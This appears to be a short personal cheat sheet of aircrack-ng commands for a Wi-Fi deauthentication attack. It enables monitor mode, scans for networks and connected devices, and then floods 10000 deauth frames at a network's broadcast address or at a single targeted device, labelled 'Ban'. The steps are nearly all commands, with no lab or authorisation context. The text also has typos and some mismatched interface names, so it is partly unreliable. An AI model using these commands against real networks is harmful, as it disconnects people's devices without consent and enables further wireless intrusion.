wlan0 or the interface you have
/usr/sbin/airmon-ng/

sudo airmon-ng check kil
//kill conflicts
sudo airmon-ng start wlan0
//Start monitor mode

sudo airmon-ng wlan0mon 
//Reachable stations and network mac

airodump-ng --bssid 'network mac' --channel 'channel' wlan0
/// View conmected device mac 
/// Identify network channel

aireplay-ng --deauth 10000 -a 'network mac' wlan0
///Because no channel here
/// Send deauth (codex) to broadcast

##############
Ban
aireplay-ng --deauth 10000 -a 'network mac' -c 'device mac'  
